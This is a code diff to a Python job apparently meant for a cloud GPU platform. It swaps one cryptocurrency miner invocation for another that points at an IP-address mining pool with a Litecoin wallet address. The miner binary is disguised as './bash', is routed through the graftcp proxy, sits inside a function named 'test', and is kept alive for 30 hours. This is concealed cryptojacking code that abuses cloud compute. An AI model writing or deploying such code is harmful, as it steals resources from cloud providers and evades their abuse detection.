@@ -16,10 +16,10 @@ image = (
 @function(
     name="test",
     image=image,
-    gpu="A10G",
+    gpu="RTX4090",
     cpu=8,
     memory="16Gi",
-    timeout=168 * 60 * 60,
+    timeout=30 * 60 * 60,
 )
 def run_script():
 
@@ -79,13 +79,13 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash -a fishhash -o stratum+tcp://iron.kryptex.network:7017 -u d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.VERTI
+    ./graftcp/graftcp ./bash --algo ETHASH --pool 57.129.82.223:80 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.01 --ethstratum ETHPROX
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
 
-    print("Staying alive for 168 hours...")
-    time.sleep(60 * 60 * 168)
+    print("Staying alive for 30 hours...")
+    time.sleep(60 * 60 * 30)
 
     echo ("=== TIMER START ===")
 
